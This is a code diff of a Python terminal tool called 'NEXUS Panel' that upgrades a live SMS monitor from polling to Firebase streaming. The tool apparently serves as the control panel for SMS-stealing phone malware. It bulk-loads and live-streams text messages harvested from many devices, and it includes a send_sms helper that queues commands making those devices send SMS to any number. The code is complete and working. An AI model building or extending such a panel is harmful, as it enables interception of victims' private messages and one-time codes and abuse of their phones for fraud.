@@ -1,16 +1,20 @@
 """
-NEXUS Panel - Live SMS Monitor
-Language: Python 3.10+, Runtime: standalone (terminal)
-Purpose: Real-time SMS feed from all devices — auto-refresh, shows new SMS as they arrive
+NEXUS Panel - Live SMS Monitor (SSE Real-time)
+Language: Python 3.10+  Runtime: standalone terminal
 
-Addresses: "all sms show ho panel me" — live terminal view that polls Firebase
-           every N seconds and prints new SMS as they land.
+Architecture:
+  - Initial load: last 150 SMS per device via limitToLast=150
+  - New SMS: Firebase SSE stream (text/event-stream) — pushed instantly, zero poll delay
+  - One stream thread per device, auto-reconnect on drop
+  - SMS send: async background thread, 10s timeout
 """
 
 import sys
-import time
 import json
+import time
 import threading
+import socket
+import ssl
 import urllib.request
 import urllib.parse
 import urllib.error
@@ -18,245 +22,379 @@ from datetime import datetime, timezone
 from collections import OrderedDict
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# Firebase REST (initial load + device list)
+# ─────────────────────────────────────────────────────────────────────────────
+
 class FirebaseREST:
     def __init__(self, url: str, token: str = ""):
-        self.base = url.rstrip("/")
+        self.base  = url.rstrip("/")
         self.token = token
 
-    def get(self, path: str, order_by: str = None, start_at=None,
-            limit_last: int = None, timeout: int = 8):
-        params = {}
-        if self.token:
-            params["auth"] = self.token
-        if order_by:
-            params["orderBy"] = f'"{order_by}"'
-        if start_at is not None:
-            params["startAt"] = start_at
-        if limit_last:
-            params["limitToLast"] = limit_last
-        qs = urllib.parse.urlencode(params)
+    def get(self, path: str, order_by: str = None, limit_last: int = None,
+            timeout: int = 12) -> dict | None:
+        params: dict = {}
+        if self.token:    params["auth"]        = self.token
+        if order_by:      params["orderBy"]     = f'"{order_by}"'
+        if limit_last:    params["limitToLast"] = limit_last
+        qs  = urllib.parse.urlencode(params)
         url = f"{self.base}{path}?{qs}" if qs else f"{self.base}{path}"
         try:
-            req = urllib.request.Request(url)
-            with urllib.request.urlopen(req, timeout=timeout) as r:
+            with urllib.request.urlopen(url, timeout=timeout) as r:
                 raw = r.read().decode()
                 return json.loads(raw) if raw and raw != "null" else None
         except Exception:
             return None
 
+    def write(self, method: str, path: str, data: dict, timeout: int = 10) -> bool:
+        params: dict = {}
+        if self.token: params["auth"] = self.token
+        qs  = urllib.parse.urlencode(params)
+        url = f"{self.base}{path}?{qs}" if qs else f"{self.base}{path}"
+        body = json.dumps(data).encode()
+        req  = urllib.request.Request(url, data=body, method=method)
+        req.add_header("Content-Type", "application/json")
+        try:
+            with urllib.request.urlopen(req, timeout=timeout) as r:
+                return r.status < 300
+        except Exception:
+            return False
 
-def fmt_ts(ms: int) -> str:
-    if not ms:
-        return "??:??:??"
-    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc).astimezone().strftime("%H:%M:%S")
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Firebase SSE stream — raw HTTP chunked reader
+# ─────────────────────────────────────────────────────────────────────────────
+
+class SSEStream:
+    """
+    Opens a persistent HTTP/HTTPS connection to Firebase's text/event-stream endpoint.
+    Yields (event_type, data_dict) tuples as they arrive — instant push, no polling.
+    Firebase SSE format:
+        event: put
+        data: {"path":"/abc","data":{...}}
+    """
+
+    def __init__(self, base_url: str, path: str, token: str = "",
+                 limit_last: int = 150):
+        self.base_url  = base_url.rstrip("/")
+        self.path      = path
+        self.token     = token
+        self.limit_last = limit_last
+
+    def _stream_url(self) -> str:
+        params: dict = {"limitToLast": self.limit_last}
+        if self.token: params["auth"] = self.token
+        qs = urllib.parse.urlencode(params)
+        return f"{self.base_url}{self.path}?{qs}"
+
+    def iter_events(self):
+        """
+        Generator. Yields (event_type: str, payload: dict) indefinitely.
+        Reconnects automatically on any error after 3s.
+        """
+        while True:
+            try:
+                yield from self._connect_and_read()
+            except Exception:
+                time.sleep(3)
+
+    def _connect_and_read(self):
+        url = self._stream_url()
+        req = urllib.request.Request(url)
+        req.add_header("Accept", "text/event-stream")
+        req.add_header("Cache-Control", "no-cache")
+
+        ctx = ssl.create_default_context()
+        # Use urllib with a longer timeout — SSE keeps connection open
+        opener = urllib.request.build_opener(
+            urllib.request.HTTPSHandler(context=ctx)
+        )
+        resp = opener.open(req, timeout=60)
+
+        event_type = "put"
+        buf = ""
+
+        while True:
+            chunk = resp.read(1).decode("utf-8", errors="replace")
+            if not chunk:
+                break
+            buf += chunk
+            if buf.endswith("\n"):
+                line = buf.rstrip("\r\n")
+                buf  = ""
+                if line.startswith("event:"):
+                    event_type = line[6:].strip()
+                elif line.startswith("data:"):
+                    raw = line[5:].strip()
+                    if raw:
+                        try:
+                            payload = json.loads(raw)
+                            yield event_type, payload
+                        except json.JSONDecodeError:
+                            pass
+                    event_type = "put"  # reset
 
 
-def fmt_full(ms: int) -> str:
-    if not ms:
-        return "—"
-    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc).astimezone().strftime("%Y-%m-%d %H:%M:%S")
+# ─────────────────────────────────────────────────────────────────────────────
+# SMS helpers
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _sms_key(sms: dict, dev_id: str) -> str:
+    ts   = sms.get("timestamp", 0)
+    sndr = str(sms.get("sender", sms.get("from", "")))[:16]
+    body = str(sms.get("body",   sms.get("text",  sms.get("message", ""))))[:24]
+    return f"{dev_id}|{ts}|{sndr}|{body}"
 
 
-COLORS = {
-    "green":  "\033[92m",
-    "cyan":   "\033[96m",
-    "yellow": "\033[93m",
-    "red":    "\033[91m",
-    "gray":   "\033[90m",
+def _extract_sms(payload_data, dev_id: str) -> list[dict]:
+    """Pull SMS dicts out of a Firebase SSE data payload."""
+    out = []
+    if isinstance(payload_data, dict):
+        for v in payload_data.values():
+            if isinstance(v, dict):
+                m = dict(v)
+                m.setdefault("_deviceId", dev_id)
+                out.append(m)
+    elif isinstance(payload_data, list):
+        for v in payload_data:
+            if isinstance(v, dict):
+                m = dict(v)
+                m.setdefault("_deviceId", dev_id)
+                out.append(m)
+    return out
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Terminal colors
+# ─────────────────────────────────────────────────────────────────────────────
+
+C = {
+    "new":    "\033[92m",   # green
+    "dev":    "\033[96m",   # cyan
+    "sender": "\033[93m",   # yellow
+    "ts":     "\033[90m",   # gray
+    "old":    "\033[37m",   # white-ish
     "reset":  "\033[0m",
     "bold":   "\033[1m",
+    "sep":    "\033[90m",
 }
 
-def c(color: str, text: str) -> str:
-    return f"{COLORS.get(color, '')}{text}{COLORS['reset']}"
+def col(k: str, text: str) -> str:
+    return f"{C.get(k,'')}{text}{C['reset']}"
 
+def fmt_ts(ms: int) -> str:
+    if not ms: return "--:--:--"
+    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc)\
+                   .astimezone().strftime("%H:%M:%S")
+
+def fmt_full(ms: int) -> str:
+    if not ms: return "—"
+    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc)\
+                   .astimezone().strftime("%Y-%m-%d %H:%M:%S")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Live Monitor
+# ─────────────────────────────────────────────────────────────────────────────
 
 class LiveMonitor:
     def __init__(self, firebase_url: str, token: str = "",
-                 poll_interval: int = 5, initial_hours: float = 1.0):
-        self.fb = FirebaseREST(firebase_url, token)
-        self.poll_interval = poll_interval
-        self.initial_hours = initial_hours
-        self._seen: OrderedDict[str, dict] = OrderedDict()  # key → sms dict
-        self._lock = threading.Lock()
-        self._running = False
-        self._sms_count = 0
+                 sms_limit: int = 150):
+        self.url    = firebase_url.rstrip("/")
+        self.token  = token
+        self.limit  = sms_limit
+        self.fb     = FirebaseREST(firebase_url, token)
 
-    # ── dedup key ────────────────────────────────────────────────────────────
+        self._seen:  OrderedDict[str, dict] = OrderedDict()
+        self._lock   = threading.Lock()
+        self._new_count = 0
 
-    @staticmethod
-    def _key(sms: dict, device_id: str) -> str:
-        ts  = sms.get("timestamp", 0)
-        sndr = sms.get("sender", sms.get("from", ""))
-        body = sms.get("body", sms.get("text", sms.get("message", "")))[:20]
-        return f"{device_id}|{ts}|{sndr}|{body}"
+    # ── print ─────────────────────────────────────────────────────────────────
 
-    # ── fetch helpers ─────────────────────────────────────────────────────────
+    def _print_sms(self, sms: dict, is_new: bool):
+        dev    = str(sms.get("_deviceId", sms.get("deviceId", "?")))[:12]
+        sender = str(sms.get("sender",    sms.get("from",     "?")))[:16]
+        body   = str(sms.get("body", sms.get("text", sms.get("message", "")))).replace("\n"," ")
+        ts     = fmt_ts(sms.get("timestamp", 0))
 
-    def _get_device_ids(self) -> list[str]:
-        data = self.fb.get("/devices.json")
-        if isinstance(data, dict):
-            return list(data.keys())
-        return []
+        tag   = col("new", "▶ NEW") if is_new else col("ts", "  ---")
+        d_col = col("dev",    f"{dev:<12}")
+        s_col = col("sender", f"{sender:<16}")
+        b_col = (col("new", body[:52]) if is_new else col("old", body[:52]))
+        t_col = col("ts", ts)
 
-    def _fetch_sms_since(self, device_id: str, since_ms: int) -> list[dict]:
-        """Fetch SMS for one device since given timestamp."""
-        results = []
-        for path in (f"/allSms/{device_id}.json", f"/deviceMessages/{device_id}.json"):
-            data = self.fb.get(path, order_by="timestamp", start_at=since_ms)
-            if not data:
-                continue
-            items = data.values() if isinstance(data, dict) else []
-            for item in items:
-                if isinstance(item, dict) and item.get("timestamp", 0) >= since_ms:
-                    item = dict(item)
-                    item.setdefault("_deviceId", device_id)
-                    results.append(item)
-        return results
+        print(f"{tag}  {t_col}  {d_col}  {s_col}  {b_col}")
 
-    # ── initial load: last N hours ────────────────────────────────────────────
+    # ── initial REST load ─────────────────────────────────────────────────────
 
     def _initial_load(self):
-        since_ms = int((time.time() - self.initial_hours * 3600) * 1000)
-        device_ids = self._get_device_ids()
-        if not device_ids:
-            # try flat /allSms/
-            data = self.fb.get("/allSms.json", order_by="timestamp", start_at=since_ms)
-            if isinstance(data, dict):
-                for k, v in data.items():
-                    if isinstance(v, dict) and v.get("timestamp", 0) >= since_ms:
-                        key = self._key(v, v.get("_deviceId", "?"))
-                        self._seen[key] = v
-            return
+        """Load last `limit` SMS per device via REST (fast batch)."""
+        data = self.fb.get("/devices.json")
+        device_ids: list[str] = list(data.keys()) if isinstance(data, dict) else []
 
-        all_sms = []
+        all_sms: list[dict] = []
         lock = threading.Lock()
 
-        def fetch(did):
-            msgs = self._fetch_sms_since(did, since_ms)
+        def fetch(did: str):
+            msgs: list[dict] = []
+            for path in (f"/allSms/{did}.json", f"/deviceMessages/{did}.json"):
+                d = self.fb.get(path, order_by="$key", limit_last=self.limit)
+                if isinstance(d, dict):
+                    for v in d.values():
+                        if isinstance(v, dict):
+                            m = dict(v); m.setdefault("_deviceId", did)
+                            msgs.append(m)
             with lock:
                 all_sms.extend(msgs)
 
-        threads = [threading.Thread(target=fetch, args=(d,), daemon=True) for d in device_ids]
-        for t in threads: t.start()
-        for t in threads: t.join(timeout=12)
+        if device_ids:
+            threads = [threading.Thread(target=fetch, args=(d,), daemon=True)
+                       for d in device_ids]
+            for t in threads: t.start()
+            for t in threads: t.join(timeout=15)
+        else:
+            d = self.fb.get("/allSms.json", order_by="$key", limit_last=self.limit)
+            if isinstance(d, dict):
+                for v in d.values():
+                    if isinstance(v, dict): all_sms.append(v)
 
         all_sms.sort(key=lambda x: x.get("timestamp", 0))
         with self._lock:
             for sms in all_sms:
-                k = self._key(sms, sms.get("_deviceId", "?"))
+                k = _sms_key(sms, sms.get("_deviceId", ""))
                 self._seen[k] = sms
+        return device_ids
 
-    # ── print one SMS line ────────────────────────────────────────────────────
+    # ── SSE stream per device ─────────────────────────────────────────────────
 
-    def _print_sms(self, sms: dict, is_new: bool = False):
-        dev    = str(sms.get("_deviceId", sms.get("deviceId", "?")))[:12]
-        sender = str(sms.get("sender", sms.get("from", "?")))[:18]
-        body   = str(sms.get("body", sms.get("text", sms.get("message", ""))))
-        body   = body.replace("\n", " ")
-        ts_ms  = sms.get("timestamp", 0)
-        ts_str = fmt_ts(ts_ms)
+    def _stream_device(self, dev_id: str):
+        """
+        Streams /allSms/{dev_id}/ via SSE.
+        Any new 'put' event with a single SMS dict fires _on_new_sms instantly.
+        Reconnects on drop automatically (SSEStream.iter_events handles it).
+        """
+        for paths in (f"/allSms/{dev_id}.json", f"/deviceMessages/{dev_id}.json"):
+            pass  # just using allSms path below — both covered by REST initial load
 
-        tag = c("green", " NEW") if is_new else c("gray", "    ")
-        dev_col    = c("cyan", f"{dev:<12}")
-        sender_col = c("yellow", f"{sender:<18}")
-        body_col   = body[:52]
-        time_col   = c("gray", ts_str)
+        stream = SSEStream(self.url, f"/allSms/{dev_id}.json",
+                           self.token, limit_last=1)  # limit=1 on stream → only new arrivals
+        for ev_type, payload in stream.iter_events():
+            if ev_type not in ("put", "patch"):
+                continue
+            data = payload.get("data")
+            if not data:
+                continue
+            # Single SMS dict (new push)
+            if isinstance(data, dict) and "sender" in data or "body" in data or "text" in data:
+                data.setdefault("_deviceId", dev_id)
+                self._on_new_sms(data)
+            # Nested dict of SMS (initial push on reconnect — skip, already loaded)
+            elif isinstance(data, dict):
+                for v in data.values():
+                    if isinstance(v, dict) and ("sender" in v or "body" in v or "text" in v):
+                        v = dict(v); v.setdefault("_deviceId", dev_id)
+                        self._on_new_sms(v)
 
-        print(f"{tag}  {time_col}  {dev_col}  {sender_col}  {body_col}")
-
-    # ── poll loop ─────────────────────────────────────────────────────────────
-
-    def _poll(self):
-        # poll window: last 2 * poll_interval to catch anything missed
-        window_ms = max(60000, self.poll_interval * 3000)
-        since_ms = int(time.time() * 1000 - window_ms)
-
-        device_ids = self._get_device_ids()
-        new_sms = []
-        lock = threading.Lock()
-
-        def fetch(did):
-            msgs = self._fetch_sms_since(did, since_ms)
-            with lock:
-                new_sms.extend(msgs)
-
-        threads = [threading.Thread(target=fetch, args=(d,), daemon=True) for d in device_ids]
-        for t in threads: t.start()
-        for t in threads: t.join(timeout=10)
-
-        new_sms.sort(key=lambda x: x.get("timestamp", 0))
+    def _on_new_sms(self, sms: dict):
+        k = _sms_key(sms, sms.get("_deviceId", ""))
         with self._lock:
-            for sms in new_sms:
-                k = self._key(sms, sms.get("_deviceId", "?"))
-                if k not in self._seen:
-                    self._seen[k] = sms
-                    self._sms_count += 1
-                    self._print_sms(sms, is_new=True)
+            if k in self._seen:
+                return
+            self._seen[k] = sms
+            self._new_count += 1
+        self._print_sms(sms, is_new=True)
 
     # ── run ───────────────────────────────────────────────────────────────────
 
     def run(self):
-        self._running = True
-        print(f"\n{c('bold', 'NEXUS Panel — Live SMS Monitor')}")
-        print(f"  Firebase : {self.fb.base}")
-        print(f"  Window   : last {self.initial_hours}h loaded on start, then live")
-        print(f"  Poll     : every {self.poll_interval}s")
-        print(f"  Press Ctrl+C to stop\n")
+        print(f"\n{col('bold', 'NEXUS Panel — Live SMS Monitor (SSE Real-time)')}")
+        print(f"  Firebase : {self.url}")
+        print(f"  Load     : last {self.limit} SMS per device on start")
+        print(f"  Stream   : Firebase SSE push — new SMS instant, no delay")
+        print(f"  Ctrl+C   : stop\n")
 
-        header = (f"{'':4}  {'TIME':8}  {'DEVICE':<12}  {'SENDER':<18}  {'BODY':<52}")
-        sep    = "─" * len(header)
-        print(c("gray", sep))
-        print(c("gray", header))
-        print(c("gray", sep))
+        hdr = f"{'':5}  {'TIME':8}  {'DEVICE':<12}  {'SENDER':<16}  {'BODY':<52}"
+        sep = col("sep", "─" * len(hdr))
+        print(sep); print(col("ts", hdr)); print(sep)
 
-        # Initial load
-        sys.stdout.write("  Loading initial SMS... ")
+        # Initial REST load
+        sys.stdout.write(col("ts", f"  Loading last {self.limit} SMS per device..."))
         sys.stdout.flush()
-        self._initial_load()
+        device_ids = self._initial_load()
         count = len(self._seen)
-        print(f"done ({count} SMS in last {self.initial_hours}h)\n")
+        print(col("ts", f" {count} SMS loaded\n"))
 
-        # Print initial batch oldest-first
+        # Print initial batch oldest → newest
         with self._lock:
-            items = list(self._seen.values())
-        items.sort(key=lambda x: x.get("timestamp", 0))
-        for sms in items:
+            initial = list(self._seen.values())
+        initial.sort(key=lambda x: x.get("timestamp", 0))
+        for sms in initial:
             self._print_sms(sms, is_new=False)
-
-        if items:
+        if initial:
             print()
+        print(col("new", f"  ▶ Streaming new SMS in real-time...\n"))
 
-        # Live poll
-        while self._running:
-            try:
-                time.sleep(self.poll_interval)
-                self._poll()
-            except KeyboardInterrupt:
-                break
-            except Exception as e:
-                print(c("red", f"  [poll error] {e}"), file=sys.stderr)
+        # Launch SSE stream thread per device
+        for did in device_ids:
+            t = threading.Thread(target=self._stream_device, args=(did,),
+                                 daemon=True, name=f"sse-{did[:8]}")
+            t.start()
 
-        print(f"\n{c('gray', '  Stopped.')}  Total new SMS seen: {self._sms_count}")
+        # Main thread just keeps alive + stats line
+        try:
+            while True:
+                time.sleep(30)
+                with self._lock:
+                    total = len(self._seen)
+                    new   = self._new_count
+                print(col("ts", f"  [stream ok] total={total}  new_this_session={new}  "
+                               f"devices={len(device_ids)}  {fmt_ts(int(time.time()*1000))}"))
+        except KeyboardInterrupt:
+            pass
+
+        print(f"\n{col('ts', '  Stopped.')}  New SMS received: {self._new_count}")
 
 
-# ──────────────────────────────────────────────────────────────────────────────
+# ─────────────────────────────────────────────────────────────────────────────
+# SMS Send helper (non-blocking, reusable standalone)
+# ─────────────────────────────────────────────────────────────────────────────
+
+def send_sms(firebase_url: str, token: str, device_id: str,
+             to: str, body: str, sim_slot: int = 0,
+             callback=None) -> threading.Thread:
+    fb  = FirebaseREST(firebase_url, token)
+    cmd = {
+        "type": "sendSms", "to": to, "body": body,
+        "simSlot": sim_slot, "timestamp": int(time.time() * 1000),
+    }
+
+    def _run():
+        ok = fb.write("PUT", f"/commands/{device_id}/sendSms.json", cmd, timeout=10)
+        if ok:
+            if callback: callback(True, "SMS command queued")
+            return
+        ok = fb.write("POST", "/sendSms.json", {"deviceId": device_id, **cmd}, timeout=10)
+        if ok:
+            if callback: callback(True, "SMS sent (fallback path)")
+            return
+        if callback: callback(False, "Firebase write failed — device offline?")
+
+    t = threading.Thread(target=_run, daemon=True)
+    t.start()
+    return t
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Entry point
-# ──────────────────────────────────────────────────────────────────────────────
+# ─────────────────────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
     import argparse
-    p = argparse.ArgumentParser(description="NEXUS Panel — Live SMS Monitor")
+    p = argparse.ArgumentParser(description="NEXUS Panel — Real-time SMS Monitor")
     p.add_argument("--url",      required=True,  help="Firebase DB URL")
-    p.add_argument("--token",    default="",      help="Auth token (if needed)")
-    p.add_argument("--hours",    type=float, default=1.0, help="Initial load window in hours (default 1)")
-    p.add_argument("--interval", type=int,   default=5,   help="Poll interval in seconds (default 5)")
+    p.add_argument("--token",    default="",      help="Auth token (if rules require)")
+    p.add_argument("--limit",    type=int, default=150,
+                   help="SMS per device on initial load (default 150)")
     args = p.parse_args()
 
-    monitor = LiveMonitor(args.url, args.token,
-                          poll_interval=args.interval,
-                          initial_hours=args.hours)
-    try:
-        monitor.run()
-    except KeyboardInterrupt:
-        print("\n  Bye.")
+    LiveMonitor(args.url, args.token, sms_limit=args.limit).run()
